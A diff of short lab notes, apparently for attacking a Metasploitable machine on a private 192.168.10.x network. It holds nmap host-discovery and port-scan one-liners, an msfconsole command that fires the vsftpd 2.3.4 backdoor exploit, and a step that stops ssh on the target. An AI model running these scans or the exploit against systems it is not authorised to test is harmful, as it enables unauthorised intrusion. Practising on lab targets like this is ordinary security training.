@@ -1,10 +1,13 @@
-# Find port
+# Find IP
 nmap -sn 192.168.10.0/24
-nmap -sP
-nmap -sV -T4 192.168.10.30
+
+# find all ips that are not itself and "host" (192.168.10.x)
+nmap  -sn 192.168.10.0/24 --exclude 192.168.10.1,192.168.10.10 | grep "Nmap scan report" | awk '{print $6}'
 
 
+# Find open ports
 nmap -sV -T4 192.168.10.15
+nmap -sV -p 21,22,2121 192.168.10.15 | grep "^PORT" -A 100 | grep open | awk '{print $1}' | cut -d'/' -f1
 
 # Attack brute force
 
@@ -23,3 +26,7 @@ msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 192.168.1
 
 echo $? # check status last command
 
+
+
+# Close ports on metasploitbale.
+service ssh stop
